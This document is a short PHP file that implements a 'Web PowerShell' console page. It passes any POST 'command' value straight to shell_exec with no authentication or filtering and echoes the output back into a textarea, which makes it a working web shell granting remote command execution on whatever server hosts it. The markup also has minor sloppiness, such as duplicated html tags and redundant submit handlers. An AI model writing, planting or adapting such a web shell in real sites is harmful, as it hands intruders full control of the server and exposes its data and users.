<?php
session_start();
$int = "Web PowerShell\nCopyright (C) M3AT58. All rights reserved.\n" . shell_exec("cd") . "\n";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!empty($_POST['command'])) {
        $command = $_POST['command'];
        if($command == "cls"){session_unset();}
        if(!isset($_SESSION['out'])){$_SESSION['out'] = '';}
        $_SESSION['out'] = $_SESSION['out'] . shell_exec($command);
        $_SESSION['result'] = $int . $_SESSION['out'];
    }
}

?>

<html>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>WEB Consol</title>
    <script>
        function pressed(e) {
            // Has the enter key been pressed?
            if ( (window.event ? event.keyCode : e.which) == 13) { 
                // If it has been so, manually submit the <form>
                document.forms[0].submit();
            }
        }
    </script>
</head>

<body>
    <form action="" method="POST" id="cmd">
        <textarea id="command" onkeydown="pressed(event)" name="command" placeholder="<?php if(!empty($_SESSION['result'])){echo $_SESSION['result'];}else{echo $int;}?>"></textarea>
    </form>
</body>
<script>
    function submitOnEnter(event){
    if(event.which === 13){
        event.target.form.dispatchEvent(new Event("submit", {cancelable: true}));
        event.preventDefault(); // Prevents the addition of a new line in the text field (not needed in a lot of cases)
    }
}

document.getElementById("command").addEventListener("keypress", submitOnEnter);
</script>

</html>

</html>